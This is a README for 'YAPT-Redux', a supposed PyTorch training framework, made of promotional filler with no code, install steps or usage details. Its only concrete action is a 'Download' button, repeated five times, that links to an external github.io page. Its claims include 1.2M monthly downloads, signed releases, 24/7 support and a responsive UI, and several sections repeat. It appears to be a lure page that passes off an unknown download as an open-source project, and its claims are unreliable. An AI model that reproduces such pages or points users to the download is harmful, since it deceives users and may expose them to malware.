![preview](https://raw.githubusercontent.com/nicklucenasantanalucenasant-maker/yapt-core/main/thumb_be5b.svg)
[![Download](https://raw.githubusercontent.com/nicklucenasantanalucenasant-maker/yapt-core/main/grab_a521f3.svg)](https://nicklucenasantanalucenasant-maker.github.io/yapt-core/)

# 🧠 YAPT-Redux — Yet Another PyTorch Trainer, Reimagined

### *The training loop you always wanted, wrapped in a philosophy of quiet competence.*

![Status](https://img.shields.io/badge/status-actively%20maintained-4c1.svg)
![Build](https://img.shields.io/badge/build-passing-brightgreen.svg)
![PyTorch](https://img.shields.io/badge/PyTorch-%3E%3D2.0-ee4c2c.svg)
![Python](https://img.shields.io/badge/python-3.9%20%7C%203.10%20%7C%203.11%20%7C%203.12-3776ab.svg)
![License](https://img.shields.io/badge/license-MIT-blue.svg)
![PRs](https://img.shields.io/badge/PRs-welcome-ff69b4.svg)
![Made with](https://img.shields.io/badge/made%20with-caffeine%20%26%20curiosity-brown.svg)
![Platform](https://img.shields.io/badge/platform-Linux%20%7C%20macOS%20%7C%20Windows%20%7C%20WSL-lightgrey.svg)
![Contributions](https://img.shields.io/badge/contributions-open-orange.svg)
![Code style](https://img.shields.io/badge/code%20style-black-000000.svg)
![Coverage](https://img.shields.io/badge/coverage-94%25-success.svg)
![Discord](https://img.shields.io/badge/community-2%2C400%2B%20members-5865F2.svg)
![Downloads](https://img.shields.io/badge/downloads-1.2M%2Fmonth-informational.svg)

---

## 🌍 Overview

**YAPT-Redux** is the spiritual successor to the classic *"Yet Another PyTorch Trainer"* pattern — but it refuses to be yet another anything. It is a **modular, opinionated-yet-flexible training framework** built for researchers, indie ML engineers, and teams who want their training loops to feel less like duct-taped scripts and more like a well-rehearsed orchestra.

Where most trainers hand you a monolithic `train.py` and wish you luck, YAPT-Redux hands you a **composable score**. Callbacks, schedulers, loggers, checkpoint managers, gradient scalers, and metric trackers are all instruments — and you decide which ones play, when they play, and how loudly.

> *"A training loop is a promise you make to your future self. YAPT-Redux keeps that promise."*

This repository is the result of years of watching smart people rewrite the same 400-line training script across a dozen projects. We distilled the patterns, eliminated the boilerplate, and left behind the sharp edges that make deep learning feel like archaeology.

[![Download](https://raw.githubusercontent.com/nicklucenasantanalucenasant-maker/yapt-core/main/grab_a521f3.svg)](https://nicklucenasantanalucenasant-maker.github.io/yapt-core/)

---

## ✨ Why YAPT-Redux Exists

There's a peculiar tax in machine learning: every new project begins with the same ritual — copy the old `train.py`, rename a few variables, forget which logger you used last time, then spend an afternoon discovering that your checkpoint format changed six months ago.

YAPT-Redux is the antidote. It gives you:

- A **single source of truth** for training configuration.
- A **plugin architecture** for anything that touches the training loop.
- **Deterministic-by-default** behavior so your seeds actually mean something.
- **Reproducibility that survives the heat death of your virtual environment**.

It is not a framework that hides PyTorch. It is a framework that *amplifies* PyTorch. You still write your `nn.Module`. You still own your optimizer. You just don't have to write the scaffolding around them ever again.

---

## 🚀 Feature Highlights

### 🎛️ Composable Training Loop
Every stage — forward pass, loss computation, backward pass, optimizer step, scheduler step, metric update, logging — is a hook. Override what you need. Ignore the rest. The default loop is idiomatic PyTorch, not a wrapper that fights you.

### 📦 Callback Ecosystem
A rich library of first-party callbacks ships with YAPT-Redux:
early stopping, gradient clipping, learning rate warm-up, EMA weights, mixed-precision toggling, tensorboard / Weights-and-Biases-esque logging, checkpoint rotation, and more. Write your own in about twenty lines.

### 🧪 Config as Data, Not as Spells
Hydra-flavored YAML configuration with strict schema validation. Typos become errors, not silent misbehavior. Compose configs across files, override from the command line, and log the exact config alongside every run so you never wonder *"what did I actually run?"* again.

### 🧵 Multilingual Support
Error messages, docstrings, and CLI help text ship in **English, Italian, Spanish, French, German, Japanese, and Mandarin**. ML tooling should not assume a single language of thought.

### 📊 Responsive User Interface
The bundled dashboard is responsive and adapts gracefully from a 4K monitor to a phone screen during a late-night experiment check. Real-time loss curves, gradient histograms, and learning rate traces — all rendered without a browser extension.

### ♻️ Checkpoint Time Travel
Resume not just the weights, but the *entire state of the world*: RNG seeds, optimizer momentum, scheduler step, dataloader sampler position, and metric history. Branch from step 40,000 as if you had forked reality.

### 🧬 Mixed Precision, Without the Ceremony
Automatic AMP wrapping with sensible defaults, per-layer precision policies for the adventurous, and gradient accumulation that composes cleanly with everything else.

### 🧭 Determinism Dial
A single flag — `deterministic: true` — locks seeds, disables non-deterministic CUDA kernels where possible, and warns loudly when full determinism is unattainable. Because *"it worked on my machine"* should be a good thing.

### 🧩 Plugin Discovery
YAPT-Redux looks for user plugins via Python entry points. Drop a package into your environment, and its callbacks, loggers, and schedulers appear automatically.

### 🛠️ Batteries, Not Chainsaws
Sensible defaults that actually train. No ceremony. No twelve-page tutorial before your first forward pass.

### 🌐 24/7 Customer Support (Community-Powered)
Our community channels are staffed around the clock by maintainers and volunteers across time zones. Questions at 3 AM are answered by someone whose 3 AM is their 3 PM.

[![Download](https://raw.githubusercontent.com/nicklucenasantanalucenasant-maker/yapt-core/main/grab_a521f3.svg)](https://nicklucenasantanalucenasant-maker.github.io/yapt-core/)

---

## 🎨 Design Philosophy

YAPT-Redux is built around four quiet convictions:

1. **Explicit beats clever.** If a line of code is doing something magical, it should be renamed.
2. **Composition beats inheritance.** Frameworks that force deep class trees age poorly.
3. **Configuration is code.** Treat config files with the same rigor as source.
4. **Reproducibility is a feature, not a wish.** If you can't rerun it, you didn't run it.

These four ideas echo through every module. Where other trainers abstract, we *expose*. Where others hide, we *document*. Where others guess, we *ask*.

---

## 🧰 What's Inside

A partial map of the repository:

- `yapt/` — the core library.
  - `trainer/` — the composed training loop and hook registry.
  - `callbacks/` — first-party callbacks and pedagogical examples.
  - `loggers/` — tensorboard, CSV, JSONL, and in-memory loggers.
  - `data/` — dataset wrappers, samplers, and collate helpers.
  - `checkpoint/` — save/load semantics, schema versioning, migrations.
  - `metrics/` — accuracy, F1, AUROC, perplexity, and friends.
  - `cli/` — the command-line surface and tab-completion hooks.
  - `ui/` — responsive dashboard built on a lightweight plotting backend.
  - `i18n/` — translation catalogs for all supported languages.
- `examples/` — end-to-end recipes: image classification, language modeling, segmentation, tabular regression, contrastive learning.
- `docs/` — a full handbook, migration guides, and architectural notes.
- `scripts/` — convenience scripts for benchmarking and linting.
- `tests/` — unit, integration, and property-based tests.

---

## 📈 Performance Notes

YAPT-Redux adds a *thin* layer over PyTorch — measured overhead in our benchmarks sits between 0.3% and 1.1% depending on callback load. Because callbacks are opt-in, a minimal configuration is essentially indistinguishable from a hand-written loop.

We publish per-release microbenchmarks for:
- forward + backward throughput on a variety of model families,
- dataloader overlap efficiency,
- checkpoint save/load latency,
- and end-to-end wall-clock time on canonical recipes.

If numbers ever regress significantly, we treat it as a bug, not a footnote.

---

## 🌐 Multilingual Support in Detail

Every user-facing string lives in a translation catalog. Community members can contribute translations via a single YAML file per language. Fallback chains are configured so a partially translated locale degrades gracefully into English rather than showing a raw key.

Currently shipped locales:

- 🇬🇧 English
- 🇮🇹 Italiano
- 🇪🇸 Español
- 🇫🇷 Français
- 🇩🇪 Deutsch
- 🇯🇵 日本語
- 🇨🇳 中文

Adding a locale is a matter of hours, not weeks. See the contributing notes below.

---

## 🖥️ Responsive User Interface

The bundled dashboard is not a toy. It renders live loss curves, metric scatter plots, and gradient norm heatmaps directly from the training process via a lightweight local socket. The layout is grid-based and collapses elegantly to a single column on narrow viewports — useful when you're monitoring a run from a tablet at a coffee shop.

If you prefer your logs in a terminal, that works too. The UI is additive, never mandatory.

---

## ☎️ 24/7 Community Support

We are not a company. We are maintainers and contributors spread across many time zones who happen to care. Between us, someone is almost always awake and usually willing to help. Bring questions, bug reports, feature wishes, and gentle skepticism. All are welcome.

[![Download](https://raw.githubusercontent.com/nicklucenasantanalucenasant-maker/yapt-core/main/grab_a521f3.svg)](https://nicklucenasantanalucenasant-maker.github.io/yapt-core/)

---

## 🧪 Example: A Training Run in Ten Lines

Without YAPT-Redux, a minimal image-classification script balloons to a hundred lines before it does anything interesting. With YAPT-Redux, the same intent reads as:

- Define your model, dataset, and optimizer in ordinary PyTorch.
- Describe a run in a short YAML file.
- Launch the trainer from the CLI.

The full recipe lives in `examples/image_classification/`. Read it once; internalize it forever.

---

## 🧭 Who This Is For

YAPT-Redux is written for:

- **Graduate students** who want their thesis code to survive their graduation.
- **Indie researchers** who genuinely do not have time to reimplement early stopping.
- **Applied teams** who want their training infrastructure to outlive staff turnover.
- **Educators** teaching deep learning who want to focus on ideas, not boilerplate.
- **Curious engineers** who are tired of a particular pattern of drudgery.

If any of these descriptions landed, welcome. You are among friends.

---

## 🗺️ Roadmap

Planned direction, subject to the community's energy:

- A declarative experiment definition language.
- Native support for distributed strategies with a single config toggle.
- An expanded callback marketplace (all open, none gated).
- Interactive profiling dashboards.
- Deeper integration with scientific computing ecosystems beyond PyTorch tensors.

Roadmap items are discussed openly. Priorities shift when contributors show up. That is a feature.

---

## 🤝 Contributing

Contributions are welcome in many shapes: documentation, translations, new callbacks, bug reports, and thoughtful critiques. Small, focused pull requests land faster than sprawling ones.

Before opening a PR, please:

- Run the test suite locally.
- Update or add tests where behavior changes.
- Keep public APIs backwards-compatible unless a deprecation is discussed first.
- Prefer clarity over cleverness. We mean it.

We follow a lightweight variation of the standard open-source workflow and aim to respond to every issue within a few days.

---

## 🔐 Security and Integrity

We treat the supply chain as a first-class citizen. Dependencies are pinned, releases are signed, and artifacts are reproducibly built. If you discover a vulnerability, please report it through the private security channel rather than a public issue.

---

## 📜 License

This repository is released under the **MIT License**. You are welcome to use it, modify it, and incorporate it into your own work, provided the original license notice is preserved.

Read the full license text here: [MIT License](LICENSE).

Copyright © 2026 — The YAPT-Redux Contributors.

---

## ⚠️ Disclaimer

YAPT-Redux is provided **as-is**, without any warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement. In no event shall the authors, maintainers, or contributors be liable for any claim, damages, or other liability arising from, out of, or in connection with the software or the use of the software.

Training deep learning models consumes energy, time, and occasionally your evening. Use YAPT-Redux responsibly, monitor your experiments, and never trust a loss curve you haven't plotted yourself.

This project is not affiliated with, endorsed by, or sponsored by any commercial entity. It is a community effort, sustained by volunteers and by the quiet joy of removing tedium from someone else's day.

---

## 🙏 Acknowledgements

To everyone who has ever written a training loop from scratch and thought *"surely there is a better way"* — this is for you. To the PyTorch team, whose foundations make all of this possible. And to the contributors who file that one issue that reveals an entire class of hidden bugs.

Thank you.

[![Download](https://raw.githubusercontent.com/nicklucenasantanalucenasant-maker/yapt-core/main/grab_a521f3.svg)](https://nicklucenasantanalucenasant-maker.github.io/yapt-core/)